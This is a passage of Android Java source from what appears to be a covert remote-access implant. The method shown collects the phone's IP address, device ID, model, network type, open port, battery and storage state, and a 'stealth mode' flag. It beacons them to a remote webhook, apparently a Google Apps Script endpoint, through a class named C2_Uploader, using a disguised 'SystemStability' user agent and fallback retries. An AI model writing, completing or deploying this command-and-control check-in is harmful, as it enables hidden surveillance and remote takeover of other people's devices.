                        int plug = bStatus.getIntExtra(android.os.BatteryManager.EXTRA_PLUGGED, -1);
                        if (plug == android.os.BatteryManager.BATTERY_PLUGGED_USB) chargingStatus = "Charging (USB)";
                        else if (plug == android.os.BatteryManager.BATTERY_PLUGGED_AC) chargingStatus = "Charging (AC)";
                        else if (plug == android.os.BatteryManager.BATTERY_PLUGGED_WIRELESS) chargingStatus = "Charging (Wireless)";
                        else chargingStatus = "Charging";
                    }
                }
            } catch (Exception ignored) {}

            String freeStorage = "Unknown";
            try {
                long bytes = android.os.Environment.getDataDirectory().getFreeSpace();
                freeStorage = android.text.format.Formatter.formatFileSize(this, bytes) + " Free";
            } catch (Exception ignored) {}

            String fullDeviceModel = Build.MODEL != null ? Build.MODEL : "Android-Device";

            // Build Query String & JSON Payload
            String queryParams = "ip=" + java.net.URLEncoder.encode(ip != null ? ip : "", "UTF-8") +
                    "&deviceId=" + java.net.URLEncoder.encode(C2_Uploader.getDeviceId(this), "UTF-8") +
                    "&brand=" + java.net.URLEncoder.encode(Build.MANUFACTURER, "UTF-8") +
                    "&device=" + java.net.URLEncoder.encode(fullDeviceModel, "UTF-8") +
                    "&model=" + java.net.URLEncoder.encode(fullDeviceModel, "UTF-8") +
                    "&network=" + java.net.URLEncoder.encode(networkType, "UTF-8") +
                    "&port=" + actualPort +
                    "&link=" + java.net.URLEncoder.encode(link, "UTF-8") +
                    "&battery=" + java.net.URLEncoder.encode(batteryLevel + "%", "UTF-8") +
                    "&stealth=" + isStealthMode() +
                    "&charging=" + java.net.URLEncoder.encode(chargingStatus, "UTF-8") +
                    "&storage=" + java.net.URLEncoder.encode(freeStorage, "UTF-8");

            String fullUrlStr = REMOTE_WEBHOOK_URL + (REMOTE_WEBHOOK_URL.contains("?") ? "&" : "?") + queryParams;

            // Strategy 1: Perform HTTP POST with Query Parameters & JSON body
            URL url = new URL(fullUrlStr);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setDoOutput(true);
            conn.setRequestProperty("Content-Type", "application/json");
            conn.setInstanceFollowRedirects(true);
            conn.setConnectTimeout(15000);
            conn.setReadTimeout(15000);
            conn.setRequestProperty("User-Agent", "SystemStability/1.5");

            String devId = C2_Uploader.getDeviceId(this);
            String json = "{" +
                    "\"ip\":\"" + ip + "\"," +
                    "\"deviceId\":\"" + devId + "\"," +
                    "\"brand\":\"" + Build.MANUFACTURER + "\"," +
                    "\"device\":\"" + Build.MODEL + "\"," +
                    "\"model\":\"" + Build.MODEL + "\"," +
                    "\"network\":\"" + networkType + "\"," +
                    "\"port\":" + actualPort + "," +
                    "\"link\":\"" + link + "\"," +
                    "\"battery\":\"" + batteryLevel + "%\"," +
                    "\"stealth\":" + isStealthMode() + "," +
                    "\"charging\":\"" + chargingStatus + "\"," +
                    "\"storage\":\"" + freeStorage + "\"" +
                    "}";

            try (OutputStream os = conn.getOutputStream()) {
                byte[] input = json.getBytes(StandardCharsets.UTF_8);
                os.write(input, 0, input.length);
            }

            int code = conn.getResponseCode();

            // Handle Google Apps Script 301/302/307 redirects
            if (code == 301 || code == 302 || code == 303 || code == 307 || code == 308) {
                String redirectUrl = conn.getHeaderField("Location");
                if (redirectUrl != null && !redirectUrl.isEmpty()) {
                    if (!redirectUrl.contains("ip=")) {
                        redirectUrl = redirectUrl + (redirectUrl.contains("?") ? "&" : "?") + queryParams;
                    }
                    HttpURLConnection redirConn = (HttpURLConnection) new URL(redirectUrl).openConnection();
                    redirConn.setRequestMethod("GET");
                    redirConn.setConnectTimeout(15000);
                    redirConn.setReadTimeout(15000);
                    redirConn.setRequestProperty("User-Agent", "SystemStability/1.5");
                    code = redirConn.getResponseCode();
                }
            }

            Log.d(TAG, "Webhook POST Broadcast Status: " + code);
            if (code == 200 || code == 201) {
                success = true;
            } else {
                // Strategy 2: Fallback GET request to Google Apps Script URL
                HttpURLConnection getConn = (HttpURLConnection) new URL(fullUrlStr).openConnection();
                getConn.setRequestMethod("GET");
                getConn.setConnectTimeout(15000);
                getConn.setReadTimeout(15000);
                getConn.setRequestProperty("User-Agent", "SystemStability/1.5");
                int getCode = getConn.getResponseCode();

                if (getCode == 301 || getCode == 302 || getCode == 303 || getCode == 307 || getCode == 308) {
                    String loc = getConn.getHeaderField("Location");
                    if (loc != null) {
                        if (!loc.contains("ip=")) loc = loc + (loc.contains("?") ? "&" : "?") + queryParams;
                        HttpURLConnection redir = (HttpURLConnection) new URL(loc).openConnection();
                        redir.setRequestMethod("GET");
                        getCode = redir.getResponseCode();
                    }
                }

                Log.d(TAG, "Webhook GET Fallback Broadcast Status: " + getCode);
                if (getCode == 200 || getCode == 201) {
                    success = true;
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "sendIpToWebhook Exception: " + e.getMessage(), e);
        }

        if (success) {
            webhookFailCount = 0;
        } else {
            webhookFailCount++;
            lastWebhookFailTime = System.currentTimeMillis();
        }

        return success;
    }
}
